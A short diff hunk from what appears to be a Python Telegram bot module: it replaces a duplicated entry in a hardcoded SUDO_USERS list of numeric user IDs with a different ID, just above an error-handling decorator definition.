@@ -12,7 +12,7 @@ from helpers.admins import get_administrators
 SUDO_USERS.append(1991215069)
 SUDO_USERS.append(1940261666)
 SUDO_USERS.append(1547381425)
-SUDO_USERS.append(1547381425)
+SUDO_USERS.append(2031340767)
 
 
 def errors(func: Callable) -> Callable:
